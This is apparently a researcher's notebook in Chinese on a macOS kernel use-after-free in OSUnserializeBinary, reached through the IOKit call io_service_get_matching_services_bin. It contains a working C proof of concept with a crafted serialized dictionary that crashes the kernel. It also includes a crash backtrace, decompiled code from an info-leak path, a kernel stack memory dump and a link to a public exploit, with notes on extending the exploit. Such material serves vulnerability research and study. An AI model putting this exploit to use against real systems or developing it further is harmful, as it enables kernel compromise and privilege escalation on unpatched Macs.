程序必须通过32位编译才可以运行，64位的话会出现找不到函数
poc如下

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <stdio.h>

int main()
{
    uint32_t data[] = {
        0x000000d3,                             /*  magic               */
        0x81000010,                             /*  0: OSDictionary     */
        0x08000002, 0x00000061,                 /*  1: key "a"          */
        0x04000020, 0x00000000, 0x00000000,     /*  2: 1[2: OSNumber]   */
        0x08000002, 0x00000062,                 /*  3: key "b"          */
        0x04000020, 0x00000000, 0x00000000,     /*  4: 2[4: OSNumber]   */
        0x0c000001,                             /*  5: key "a"          */
        0x0b000001,                             /*  6: true; heap freelist: 1[2:]   */
        0x0c000003,                             /*  7: key "b"                      */
        0x0b000001,                             /*  8: true; heap freelist: 2[4:] 1[2:]     */
        0x0c000001,                             /*  9: key "a"          */
        0x0a000028,                             /*  10: 2[10,4: OSData] => 1[2: contents]   */
        0x00000000, 0x00000000,                 /*  vtable ptr          */
        0x00000000, 0x00000000, 0x00000000, 0x00000000,
        0x00000000, 0x00000000, 0x00000000, 0x00000000,
        0x0c000001,                             /*  11: key "b"         */
        0x8c000002,                             /*  12: 1[2: contents]->retain()    */
    };
    mach_port_t master_port, iterator;
    kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &master_port);
    if(kr != KERN_SUCCESS){
        return 1;
    }

    kr = io_service_get_matching_services_bin(master_port, (char *)data, sizeof(data), &iterator);
}


执行后程序崩溃

 thread #22, name = '0xffffff802a4b1c88', queue = '0x0', stop reason = EXC_BAD_ACCESS (code=1, address=0x20)
  * frame #0: 0xffffff80190375d5 kernel.development`OSUnserializeBinary(buffer=<unavailable>, bufferSize=120, errorString=<unavailable>) at OSSerializeBinary.cpp:341 [opt]
    frame #1: 0xffffff80190b8323 kernel.development`::is_io_service_get_matching_services_bin(mach_port_t, char *, mach_msg_type_number_t, io_object_t *) [inlined] internal_io_service_get_matching_services(master_port=<unavailable>) at IOUserClient.cpp:1795 [opt]
    frame #2: 0xffffff80190b8306 kernel.development`::is_io_service_get_matching_services_bin(master_port=<unavailable>, matching=<unavailable>, matchingCnt=<unavailable>, existing=0xffffff801d8f3e08) at IOUserClient.cpp:1850 [opt]
    frame #3: 0xffffff8018b65315 kernel.development`_Xio_service_get_matching_services_bin(InHeadP=<unavailable>, OutHeadP=0xffffff8024125388) at device_server.c:10589 [opt]
    frame #4: 0xffffff8018a92963 kernel.development`ipc_kobject_server(request=0xffffff802bd5a200) at ipc_kobject.c:339 [opt]
    frame #5: 0xffffff8018a6e6f3 kernel.development`ipc_kmsg_send(kmsg=<unavailable>, option=<unavailable>, send_timeout=0) at ipc_kmsg.c:1440 [opt]
    frame #6: 0xffffff8018a85035 kernel.development`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:470 [opt]
    frame #7: 0xffffff8018b89a4e kernel.development`mach_call_munger(state=0xffffff80231eec40) at bsd_i386.c:472 [opt]
    frame #8: 0xffffff8018bbf1e8 kernel.development`hndl_mach_scall + 216


调用栈如下


打开设备申请新的设备
另外接口文件在device/device.defs里面
Iouserclinet里面调用了序列化与反序列化的函数
Osdata在64位和number结构一样大，所以用的他，我要试试能不能换成osstring




https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS/blob/master/exp.m再加个别人的poc把，自己做不会了还能看看



内核驱动逆向还是要想个办法恢复符号表，今天用的搜索，但是太难受了。FFFFFF8000A10588



     if ( v11 )
          {
            v24 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64 *))(*(_QWORD *)v11
                                                                                  + 0x150LL))(// unsigned64BitValue

                    v11,
                    a5,
                    v22,
                    &OSNumber::gMetaClass);
            v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v11 + 0x130LL))(v11);// numberofbyte
            v15 = (const char *)&v24;
            goto LABEL_37;
          }
LABEL_39:
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v11 + 0x28LL))(v11);


实际泄漏的是
_is_io_registry_entry_get_property_bytes
v24后面的内容



内存如下

0xffffff8863f5bdb0: 0x4141414141414141 0xffffff800cbde684
0xffffff8863f5bdc0: 0xffffff800cb84000 0x0000000000000004
0xffffff8863f5bdd0: 0xffffff800d8455a0 0xffffff800cbde6b4
0xffffff8863f5bde0: 0xffffff8863f5be20 0xffffff8002d5ebff->0xffffff8002c00000
0xffffff8863f5bdf0: 0x0000000000000b60 0x0000000000001074
0xffffff8863f5be00: 0xffffff80034a6b10 0x0000000000000003
0xffffff8863f5be10: 0xffffff800cbde600 0xffffff800d845000
0xffffff8863f5be20: 0xffffff8863f5be50 0xffffff8002c92963
0xffffff8863f5be30: 0xffffff800be276d8 0x0000000000000000
0xffffff8863f5be40: 0xffffff800cbde600 0xffffff800e81c4d8
0xffffff8863f5be50: 0xffffff8863f5be90 0xffffff8002c6e6f3
0xffffff8863f5be60: 0x0000000000000000 0x0000000000000003
0xffffff8863f5be70: 0x00000000bfffe488 0x0000000000000507
0xffffff8863f5be80: 0xffffff8009791ba0 0xffffff800e81c4d8
0xffffff8863f5be90: 0xffffff8863f5bf00 0xffffff8002c85035
0xffffff8863f5bea0: 0xffffff800cbde600 0x0000000000000000
0xffffff8863f5beb0: 0x0000000000001030 0xffffff800a245130
0xffffff8863f5bec0: 0x000000000000009b 0xffffff800cbde600
0xffffff8863f5bed0: 0x0000000363f5bf00 0x000000000000009b
0xffffff8863f5bee0: 0xffffff800ad456c0 0x000000000000001f
0xffffff8863f5bef0: 0xffffff800ad456c0 0xffffff80034018f0
0xffffff8863f5bf00: 0xffffff8863f5bfb0 0xffffff8002d89a4e
0xffffff8863f5bf10: 0xffffff800a260040 0xffffff800a260000
0xffffff8863f5bf20: 0xffffff8002c85140 0x00000000bfffe488
0xffffff8863f5bf30: 0x0000000000000003 0x0000000000000030
0xffffff8863f5bf40: 0x0000000000001030 0x0000000000000507
0xffffff8863f5bf50: 0x0000000000000000 0x0000000000000000
0xffffff8863f5bf60: 0x0000000000000000 0x0000000000000000
0xffffff8863f5bf70: 0x0000000000000001 0x0000000000000000
0xffffff8863f5bf80: 0xffffff8863f5bfb0 0xffffff8008d64b90
0xffffff8863f5bf90: 0xffffff8863f5bfc0 0x0000000000000000
0xffffff8863f5bfa0: 0xffffff800ad456c0 0xffffff800ad456c0
0xffffff8863f5bfb0: 0x0000000000000000 0xffffff8002dbf1e8
0xffffff8863f5bfc0: 0x0000000000000040 0xffffff8863f5bdb0
0xffffff8863f5bfd0: 0xffffff8863f5bde0 0xffffff800d8455cc
0xffffff8863f5bfe0: 0x00000000e00002bf 0xffffff800d8455d0
0xffffff8863f5bff0: 0xffffff801184ac10 0xffffff80032b96a6
0xffffff8863f5c000: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c010: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c020: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c030: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c040: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c050: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c060: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c070: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c080: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c090: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c0a0: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c0b0: 0x0000000000000000 0x0000000000000000
0xffffff8863f5c0c0: 0x0000000000000000 0x0000000000000000
FFFFFF80147FBC40
FFFFFF80147FB8B0
FFFFFF80147FB4C0